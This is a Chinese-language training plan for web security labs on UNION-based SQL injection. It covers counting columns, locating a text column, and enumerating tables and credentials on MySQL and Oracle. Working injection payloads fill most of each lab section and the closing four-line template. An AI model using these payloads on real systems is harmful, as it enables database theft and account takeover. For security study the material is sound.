# Day 4 · UNION 起步与库表枚举（3 h）

> 目标：把"数列数 + 找字符列"练成 30 秒以内，然后用 `information_schema` / `all_tables` 把库里的表名、列名、数据全掏出来。
> 今天只有一个真正的难点：**UNION 的列数、列类型必须严格对齐**。对不齐就报错，报错就是你唯一的提示。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:20 | 两种数列数方法 + 列类型规则 | 一张对照表 |
| 00:20–00:50 | Lab 13 数出列数 | `ORDER BY` 到报错 |
| 00:50–01:20 | Lab 14 找字符列 | `'a'` 定位 |
| 01:20–02:00 | Lab 15 非 Oracle 库表枚举 | `information_schema` 三连 |
| 02:00–02:40 | Lab 16 Oracle 库表枚举 | `all_tables` / `all_tab_columns` |
| 02:40–03:00 | 归纳 + 写"枚举模板" | 可复用 4 行 payload |

---

## 0. 两条铁律

### 铁律一：列数必须相等

`UNION SELECT` 要求两边列数完全一致，否则 `ORA-01789` / `The used SELECT statements have a different number of columns`。

数列数两种方法：

**方法 A：`ORDER BY`（推荐先用）**
```
' ORDER BY 1--     → 正常
' ORDER BY 2--     → 正常
' ORDER BY 3--     → 正常
' ORDER BY 4--     → 报错 → 说明是 3 列
```
优点：不需要管列类型；缺点：只能用于 `SELECT` 且 `ORDER BY` 位置在注入点之后。

**方法 B：`UNION SELECT NULL` 递增**
```
' UNION SELECT NULL--            → 报错
' UNION SELECT NULL,NULL--       → 报错
' UNION SELECT NULL,NULL,NULL--  → 正常 → 3 列
```
优点：`NULL` 适配任何类型，报错/正常二值清晰；缺点：请求数多。

### 铁律二：列类型必须兼容

- 数字列里塞 `'a'` → 报错（隐式转换失败）
- 字符列里塞 `NULL` → 正常，但不显示内容
- **只有字符列 + 真实字符串，才会把内容渲染到页面上**

所以流程是：先 `NULL` 探列数 → 再把 `'a'` 一个个换进去，看哪一列 **真的把 a 显示出来了**。

---

## Lab 13 · UNION attack, determining the number of columns（Practitioner / 30 min）

### 一句话
`ORDER BY` 一直加到报错，报错前那个数字就是列数。

### 观察
`/filter?category=Gifts` 存在注入。依次：

```
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
/filter?category=Gifts' ORDER BY 4--      ← 500
```

→ **3 列**（以你实测的报错位置为准；不同 lab 的列数不同，方法比数字重要）。

### 攻击
```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

页面正常渲染（列数为 3，类型都被 `NULL` 适配），lab 判 Solved。

### 为什么有效
`ORDER BY n` 里的 n 是"第 n 个选择列"，超出列数时数据库直接报错。用它探列数不会触发类型转换，是最干净的办法。

### 坑
- 有人用 `ORDER BY 1,2,3` 试，语法含义完全不同（多列排序），会误判。
- `ORDER BY` 之后如果还有 `LIMIT`，某些库要求 `ORDER BY` 在 `LIMIT` 前——这里不用管，但真实目标上注意。
- URL 里 `--` 结尾可能被裁，统一写 `--+`。

### 带走
**先 ORDER BY 到报错，再 UNION NULL 验证。** 两步都过，列数就锁死了，后面所有 payload 都基于这个数字。

---

## Lab 14 · UNION attack, finding a column containing text（Practitioner / 30 min）

### 一句话
3 列里只有某一列会把字符串渲染出来；把 `'a'` 轮流放进每一列，看谁显示。

### 观察
已确认 3 列。先全 `NULL` 打底：

```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

然后逐列替换：

```
/filter?category=Gifts' UNION SELECT 'a',NULL,NULL--
/filter?category=Gifts' UNION SELECT NULL,'a',NULL--
/filter?category=Gifts' UNION SELECT NULL,NULL,'a'--
```

三发里只有一发会在页面上出现 `a`（另外两发要么报错，要么不显示）。出现 `a` 的那一列就是**字符列**。

### 攻击
本 lab 三列里只有一列会把字符串渲染出来。以实测命中的那一列为准（三发都试一遍只要 1 分钟），例如命中第 2 列时：

```
/filter?category=Gifts' UNION SELECT NULL,'a',NULL--
```

页面显示 `a` → Solved。

### 为什么有效
应用只渲染"产品名/描述"这类字符串字段；把字符串放进对应列，它就跟着结果集一起被模板渲染出来。这是"回显确认"，也是后面把 `username`、`password` 塞进去的通道。

### 坑
- 三发全都不显示？说明三列都不是字符列（或者列被模板丢弃），改用 `UNION SELECT NULL,'a',NULL` 逐列试 + 检查 HTML 源码（有时被 CSS 隐藏）。
- `'a'` 报错说明该列是数字类型，跳过它。

### 带走
找到字符列 = 找到"输出口"。记下它的**列序号**，后面所有取数 payload 都把字符串放这个位置，其余列填 `NULL`。

---

## Lab 15 · Listing the database contents on non-Oracle（Practitioner / 40 min）

### 一句话
`information_schema.tables` → `information_schema.columns` → 目标表，三步把库翻个底朝天。

### 观察
- 注入点同上，先数列数：本 lab 是 **2 列**（`ORDER BY 3--` 报错）。
- 第 2 列是字符列（`'a'` 测试）。
- 目标：登录 `administrator`，所以要先拿到它的密码。

### 攻击（三段式，逐段复制）

**Step 1：列出所有表**
```
/filter?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```
MySQL 会把所有库的表都列出来，噪音很大。加过滤更清爽：
```
/filter?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
```
从中找到形如 `users_abcdef` 的表（后缀随机，每个实例不同）。

**Step 2：列出该表的列**
```
/filter?category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```
得到 `username_xyz`、`password_abc` 这类随机后缀的列名。

**Step 3：直接取数据**
```
/filter?category=Gifts' UNION SELECT username_xyz, password_abc FROM users_abcdef--
```
拿到 `administrator` 的密码 → 回 `/login` 登录 → Solved。

### 为什么有效
`information_schema` 是 MySQL/MSSQL/PostgreSQL 的"元数据字典"，`tables`/`columns` 两张视图把"库里有啥"完全暴露。有了表名和列名，`UNION` 就能直接把它们的值当普通查询结果取出来。

### 坑
- **表名/列名带随机后缀**，必须从上一步的输出里复制，不能猜 `users`。这是本 lab 唯一的"时间黑洞"。
- 一次只能取一列（2 列结果集，1 列放表名，1 列必须 `NULL`），所以要分三次请求。
- `table_schema` 过滤在 PostgreSQL 里应写 `table_schema='public'`，别照抄 MySQL 的 `database()`。
- 结果集里行太多时，页面只显示前几条——用 `WHERE table_name LIKE '%users%'` 收窄。

### 带走
真实目标上，`information_schema` 一被注入就等于库结构全泄露。**枚举顺序永远是：表 → 列 → 数据，一次只取一列，用 LIKE/等值收窄。**

---

## Lab 16 · Listing the database contents on Oracle（Practitioner / 40 min）

### 一句话
Oracle 没有 `information_schema`，换成 `all_tables` / `all_tab_columns`，并且**标识符默认大写**。

### 观察
- 注入点同上，本 lab 是 **2 列**。
- 先确认 Oracle：`UNION SELECT NULL FROM dual` 能通，不带 FROM 就报错。
- Oracle 的系统视图：`all_tables`（当前用户可见的所有表）、`all_tab_columns`（对应列）、`user_tables` / `user_tab_columns`（仅当前 schema）。

### 攻击

**Step 1：列表**
```
/filter?category=Gifts' UNION SELECT table_name, NULL FROM all_tables--
```
找到 `USERS_ABCDEF`（**大写**）。

**Step 2：列列**
```
/filter?category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
```
得到 `USERNAME_XYZ`、`PASSWORD_ABC`。

**Step 3：取数**
```
/filter?category=Gifts' UNION SELECT USERNAME_XYZ, PASSWORD_ABC FROM USERS_ABCDEF--
```
拿 `administrator` 的密码 → 登录 → Solved。

### 为什么有效
和 Lab 15 完全同构，只是把"元数据字典"从 `information_schema.*` 换成 Oracle 的 `all_*` 视图。Oracle 把未加引号的标识符统一存成大写，所以 `WHERE table_name='users_abcdef'` 查不到，必须大写。

### 坑
- **大小写**：`table_name='USERS_ABCDEF'` 不加大写 → 空结果，很容易误判"表不存在"。这个坑占了本 lab 一半时间。
- `all_tables` 里系统表极多，直接 `WHERE table_name LIKE 'USERS%'` 收窄。
- Oracle 的 `--` 后面要有空格，URL 用 `--+`。
- 取数时如果列是 `NUMBER` 类型（比如某 ID 列），不要 `UNION` 进去，只取需要的两列。

### 带走
换库只换三样东西：**元数据视图名、标识符大小写、字符串拼接符**。其余思路一模一样。

---

## 当日复盘

### 复用模板（背这四行）

```
① ' ORDER BY n--                     数列数（n 加到报错）
② ' UNION SELECT NULL,...--          验证列数
③ ' UNION SELECT 'a',NULL,...--      找字符列（逐列换）
④ ' UNION SELECT 表.列, NULL FROM ... 取数
```

### MySQL vs Oracle 枚举对照

| 目的 | MySQL | Oracle |
|------|-------|--------|
| 列表 | `information_schema.tables` | `all_tables` |
| 列列 | `information_schema.columns` | `all_tab_columns` |
| 当前库过滤 | `table_schema=database()` | `owner='<SCHEMA>'` |
| 标识符大小写 | 原样 | 默认大写 |
| 必须 FROM | 否 | 是（`dual`） |

### 三个问题自测
1. 为什么 `ORDER BY 4` 报错就能确定是 3 列，而 `UNION SELECT NULL,NULL,NULL` 正常只是"验证"？
2. 为什么数字列里放 `'a'` 会报错，放 `NULL` 不会？
3. Lab 15/16 为什么必须分三次请求，不能一条 SQL 同时取表名、列名、数据？

### 明日预告
Day 5 把 `UNION` 的最后一公里走完（取 `users` 表、单列拼接多值），然后进入**盲注**：页面不给你看数据，只给你"Welcome back 有没有"。当天要开始用 Intruder 跑字符集，第一次会觉得慢，习惯后就是流水线。
